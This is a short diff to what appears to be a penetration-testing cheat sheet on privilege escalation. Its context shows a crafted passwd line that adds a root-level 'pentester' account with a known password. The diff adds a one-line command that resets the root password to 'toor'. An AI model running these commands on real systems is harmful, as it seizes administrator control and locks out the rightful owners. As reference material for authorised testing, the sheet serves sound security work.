@@ -269,6 +269,11 @@ id
 <code> pentester:$1$2AL4ULeB$vPb2hnoy5xgsBueJSXTsj0:0:0::/:/bin/bash </code>
 Password1
 
+#### fast change password
+
+
+`echo root:toor | chpasswd`
+
 ### Shadow file 
 
 #### make shadow files
